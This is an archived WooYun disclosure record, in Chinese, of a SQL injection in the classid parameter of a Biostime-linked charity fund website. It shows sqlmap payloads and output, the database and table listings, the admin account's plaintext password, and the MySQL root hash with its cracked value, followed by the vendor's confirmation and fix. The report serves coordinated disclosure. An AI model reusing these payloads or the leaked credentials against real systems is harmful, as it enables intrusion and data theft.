{"id": 26940, "wybug_id": "wooyun-2015-0127295", "wybug_title": "合生元旗下某站SQL注入漏洞（root权限）", "wybug_corp": "广州市合生元生物制品有限公司", "wybug_author": "Ton7BrEak", "wybug_date": "2015-07-19 16:48", "wybug_open_date": "2015-09-03 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向公众公开  简要描述： 合生元旗下某站SQL注入漏洞（root权限） 详细说明：  001x 问题出在这个站点http://www.babycarefund.org/版权所有中国红十字基金会-合生元母婴救助基金通过查询可知该站和合生元在一个IP上\n\n002x 注入点\nhttp://www.babycarefund.org/news.php?classid=7 (GET)\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: classid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: classid=7 AND 5915=5915    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: classid=7 AND SLEEP(5)    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])---[09:42:34] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.4.14back-end DBMS: MySQL 5.0.11\n\navailable databases [6]:[*] biostimeqma[*] information_schema[*] jijinhui[*] mysql[*] sujia[*] test\n当前数据库\nDatabase: jijinhui+----------------+---------+| Table          | Entries |+----------------+---------+| w_apply        | 6825    |-----基金申请| w_region       | 3027    || w_question     | 738     || w_document     | 454     || w_news         | 158     || w_country      | 34      || w_menu         | 27      || w_product      | 18      || w_webbanner    | 10      || w_webcontent   | 8       || w_newsclass    | 6       || w_productclass | 6       || w_type         | 5       || w_class        | 3       || w_newstype     | 3       || w_media        | 2       || w_message      | 2       || w_area         | 1       || w_smtpconfig   | 1       || w_user         | 1       |+----------------+---------+\n\nDatabase: jijinhuiTable: w_user[1 entry]+------+------+--------+------------+-----------+------------+----------------+| c_id | u_id | u_name | u_date     | u_content | u_username | u_password     |+------+------+--------+------------+-----------+------------+----------------+| 1    | 1    | admin  | 2010-04-01 | 1         | admin      | babycarefund07 |\n\n\n\ndatabase management system users password hashes:[*] root [1]:    password hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B\n仅此一个账户，密码解密为 root网络太渣就不继续深入了，证明即可   修复方案：     版权声明：转载请注明来源 Ton7BrEak@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-07-20 14:53 厂商回复： 非常感谢路人甲的发现，我们已在积极处理中。 最新状态： 2015-07-27：漏洞修正中，突然发现，最早系统显示发现者是路人甲，现在变成了Ton7BrEak。不过还是感谢此漏洞的发现者，谢谢。 2015-08-25：非常感谢Ton7BrEak的漏洞提示，我们已经对此漏洞进行修复，谢谢您的贡献。  ", "replys": "漏洞评价：\n评论\n     2015-08-26 09:15 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  有饼干送吗？哈哈  @广州市合生元生物制品有限公司    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}